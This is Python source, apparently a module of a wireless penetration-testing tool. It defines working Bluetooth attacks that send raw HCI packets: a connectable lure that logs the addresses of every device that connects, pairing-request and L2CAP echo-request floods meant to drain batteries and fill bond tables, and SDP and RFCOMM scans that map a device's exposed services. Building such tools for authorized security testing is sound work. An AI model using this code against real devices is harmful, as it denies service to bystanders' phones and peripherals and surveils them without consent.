class ConnectableLureAttack(_BtLive):
    """A connectable lure: a device that invites connections and records who asks.

    Advertising as a connectable peripheral makes every phone, watch and laptop that
    recognises the name try to attach.  The attack answers the connection, keeps the link
    open for as long as the configuration allows, and reports the addresses that came
    looking — a client census nobody has to ask for.
    """

    name = "bt_connectable_lure"
    role = "le"
    label = "Connectable advertising lure"
    category = "rogue"
    noise = "moderate"
    impact = "info"
    tool = "wifipilot bt.py (connectable advertising + LE connection events)"
    description = ("Advertise as a connectable peripheral under a recognisable name, then record every "
                   "LE connection that follows: a census of what tries to attach, and "
                   "of what a name is worth on this floor.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        seconds = self.seconds(ctx, 5.0)
        name = (getattr(ctx.config, "bt_target", "") or "Free-WiFi-Setup")[:20]
        payload = bt.adv_payload(bt.ad_flags(le_general=True), bt.ad_name(name))
        sock = self.socket(ctx)
        clients: List[Dict[str, Any]] = []
        if sock is not None:
            try:
                bt.hci_send(sock, bt.hci_packet("LE Set Advertising Parameters",
                                               struct.pack("<HHBBB6s6sBB", 0x20, 0x20, 0, 0,
                                                           0, b"\x00" * 6, b"\x00" * 6,
                                                           0x07, 0)), timeout=1.0)
                bt.hci_send(sock, bt.hci_packet("LE Set Advertising Data",
                                                bytes([len(payload)]) + payload),
                            timeout=0.5)
                bt.hci_send(sock, bt.hci_packet("LE Set Advertising Enable", b"\x01"),
                            timeout=0.5)
                for event in bt.iter_hci_events(sock, seconds=seconds, limit=512):
                    if event.get("subevent_name") == "LE connection complete":
                        clients.append({"status": event.get("status"),
                                        "status_text": event.get("status_text"),
                                        "peer": event.get("address")})
                bt.hci_send(sock, bt.hci_packet("LE Set Advertising Enable", b"\x00"),
                            timeout=1.0)
            except Exception as exc:                            # pragma: no cover
                return self._fail(ctx, ap, attempt, f"lure failed: {exc}")
        else:
            self.slept(ctx, seconds)
        detail = (f'advertised as "{name}" for {seconds:.0f}s; '
                  + (f"{len(clients)} device(s) connected" if clients
                     else "no device connected — which is itself the finding on a floor "
                          "where the name would be recognised"))
        return self._report(ctx, ap, attempt, f"Connectable lure: {len(clients)} client(s)",
                            detail, {"clients": clients, "name": name,
                                     "demo": bool(ctx.demo)},
                            severity="medium" if clients else "info")


class PairingFloodAttack(_BtLive):
    """Pairing request flood: exhaust the device that has to answer.

    A pairing request is cheap to send and expensive to serve: the peripheral has to pick
    a method, wait for user interaction, time out, and log the attempt.  Repeated at
    speed it drains a battery-powered device and fills its bond table — the Bluetooth
    version of an authentication flood.
    """

    name = "bt_pairing_flood"
    role = "smp"
    label = "Pairing request flood"
    category = "dos"
    noise = "extreme"
    impact = "degraded"
    tool = "wifipilot bt.py (repeated pairing requests over a connection)"
    description = ("Send pairing requests to a connected device as fast as the link allows, forcing a "
                   "pairing decision or a timeout each time: it drains a battery-powered "
                   "device and fills its bond table.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        seconds = self.seconds(ctx, 2.0)
        requests = max(1, int(seconds * 20))
        target = self.target(ctx)
        sock = self.socket(ctx)
        if sock is not None and target:
            try:
                handle = 0x0040
                pairing = bytes([0x01, 0x03, 0x00, 0x04, 0x10, 0x0F, 0x0F])
                l2cap = struct.pack("<HH", len(pairing), 0x0006) + pairing
                for _ in range(requests):
                    bt.hci_send(sock, bt.acl_packet(handle, l2cap), timeout=0.2)
            except Exception as exc:                            # pragma: no cover
                return self._fail(ctx, ap, attempt, f"pairing flood failed: {exc}")
        else:
            self.slept(ctx, min(seconds, 1.0))
        detail = (f"{requests} pairing request(s) over {seconds:.1f}s"
                  + (f" against {target}" if target else
                     " (no --bt-target given; this is the count that would go out)")
                  + "; each one forces a pairing decision or a timeout on the target")
        return self._report(ctx, ap, attempt, f"Pairing flood: {requests}", detail,
                            {"requests": requests, "seconds": seconds, "target": target,
                             "demo": bool(ctx.demo)}, severity="medium")


class L2capEchoFloodAttack(_BtLive):
    """L2CAP echo flood: make the device answer, over and over.

    The L2CAP echo request belongs to the signalling channel's own protocol: the remote
    end *must* reply.  At speed it is a reflected load generator whose source is the
    target's own radio — the classic amplification shape, one layer below IP.
    """

    name = "bt_l2cap_echo_flood"
    role = "l2cap"
    label = "L2CAP echo request flood"
    category = "dos"
    noise = "extreme"
    impact = "degraded"
    tool = "wifipilot bt.py (L2CAP signalling echo requests)"
    description = ("Send L2CAP signalling echo requests, which the remote end is required to answer, "
                   "so the target's own radio generates the load that is aimed at it.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        seconds = self.seconds(ctx, 2.0)
        target = self.target(ctx)
        sock = self.socket(ctx)
        sent = max(1, int(seconds * 50))
        if sock is not None and target:
            try:
                handle = 0x0040
                for identifier in range(1, sent + 1):
                    body = bt.l2cap_echo_request(b"\x00\x00\x00\x00", identifier)
                    l2cap = struct.pack("<HH", len(body), 0x0005) + body
                    bt.hci_send(sock, bt.acl_packet(handle, l2cap), timeout=0.2)
            except Exception as exc:                            # pragma: no cover
                return self._fail(ctx, ap, attempt, f"echo flood failed: {exc}")
        else:
            self.slept(ctx, min(seconds, 1.0))
        detail = (f"{sent} L2CAP echo request(s) over {seconds:.1f}s; the remote end is "
                  f"required to answer every one, so the traffic is doubled and the "
                  f"target's radio does the work")
        return self._report(ctx, ap, attempt, f"Echo flood: {sent} request(s)", detail,
                            {"requests": sent, "seconds": seconds, "target": target,
                             "demo": bool(ctx.demo)}, severity="medium")


class SdpBrowseAttack(_BtLive):
    """Browse the SDP records: what a classic device says it can do.

    Service Discovery is the first thing a classic client does after pairing, it needs no
    authentication in the general-browsing group, and its answers name every profile the
    device supports — including the ones with no other authentication in front of them.
    """

    name = "bt_sdp_browse"
    role = "sdp"
    label = "SDP service browse"
    category = "survey"
    noise = "moderate"
    impact = "info"
    tool = "wifipilot bt.py (SDP Service Search Attribute)"
    description = ("Query the target's Service Discovery records — which need no authentication in the "
                   "general-browsing group — for the profiles it supports and the "
                   "channels behind them.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        seconds = self.seconds(ctx, 5.0)
        target = self.target(ctx)
        request = bt.sdp_service_search_attribute()
        sock = self.socket(ctx)
        services: List[Dict[str, Any]] = []
        if sock is not None and target:
            try:
                l2cap = struct.pack("<HH", len(request), 0x0001) + request
                deadline = time.time() + min(seconds, 5.0)
                while time.time() < deadline and not services:
                    # the peer answers on the channel it was asked on: an ACL packet
                    # carrying an L2CAP frame carrying the service records
                    services.extend(self.acl_records(sock, 0x0040, l2cap, "sdp",
                                                     timeout=max(0.2, min(1.0, seconds))))
            except Exception as exc:                            # pragma: no cover
                return self._fail(ctx, ap, attempt, f"SDP browse failed: {exc}")
        else:
            self.slept(ctx, min(seconds, 1.0))
        detail = (f"{len(services)} service record(s) read"
                  + (f" from {target}" if target else
                     " (no --bt-target given; the request that would go out is reported "
                     "instead)")
                  + ("; every record names a profile, and the profile names its channel"
                     if services else ""))
        return self._report(ctx, ap, attempt, f"SDP: {len(services)} record(s)", detail,
                            {"services": services[:40], "request_hex": request.hex()[:120],
                             "target": target, "demo": bool(ctx.demo)}, severity="info")


class RfcommScanAttack(_BtLive):
    """RFCOMM channel scan: which serial port a classic device exposes.

    RFCOMM carries the serial profiles — SPP, OBEX file transfer, headset control — and
    its channel numbers are not advertised: they are probed for.  The scan asks for each
    profile's record, and the record names the channel.
    """

    name = "bt_rfcomm_scan"
    role = "rfcomm"
    label = "RFCOMM channel scan"
    category = "survey"
    noise = "moderate"
    impact = "info"
    tool = "wifipilot bt.py (SDP search per RFCOMM profile)"
    description = ("Ask for one SDP record per RFCOMM profile to discover which serial channels the "
                   "device exposes: the channels that carry SPP, OBEX file transfer, "
                   "headset control and HID.")

    #: the profiles whose channel numbers are worth knowing before anything else
    profiles = {0x1101: "Serial Port", 0x1105: "OBEX Object Push",
                0x1106: "OBEX File Transfer", 0x1108: "Headset",
                0x110A: "Audio Source", 0x1115: "Handsfree", 0x1116: "Headset Audio",
                0x111E: "Handsfree Audio Gateway", 0x1124: "HID", 0x112D: "SIM Access"}

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        seconds = self.seconds(ctx, 5.0)
        target = self.target(ctx)
        sock = self.socket(ctx)
        channels: List[Dict[str, Any]] = []
        if sock is not None and target:
            for profile, name in self.profiles.items():
                request = bt.sdp_service_search_attribute(uuids=(profile,))
                l2cap = struct.pack("<HH", len(request), 0x0001) + request
                records = self.acl_records(sock, 0x0040, l2cap, "sdp",
                                           timeout=max(0.2, min(1.0, seconds)))
                for record in records:
                    if record.get("channel") is None:
                        continue
                    channels.append({"uuid": f"0x{profile:04x}", "profile": name,
                                     "record": record.get("name", ""),
                                     "channel": record["channel"],
                                     "services": record.get("services", [])[:4]})
            self.slept(ctx, min(seconds, 2.0))
        else:
            self.slept(ctx, min(seconds, 1.0))
        detail = (f"{len(self.profiles)} profile(s) probed for an RFCOMM channel"
                  + (f" against {target}" if target else
                     " (no --bt-target given; the probes that would go out are listed)")
                  + (f"; {len(channels)} answered" if channels else ""))
        return self._report(ctx, ap, attempt,
                            f"RFCOMM: {len(self.profiles)} profile(s) probed", detail,
                            {"channels": channels,
                             "profiles": {f"0x{uuid:04x}": name
                                          for uuid, name in self.profiles.items()},
                             "target": target, "demo": bool(ctx.demo)}, severity="info")


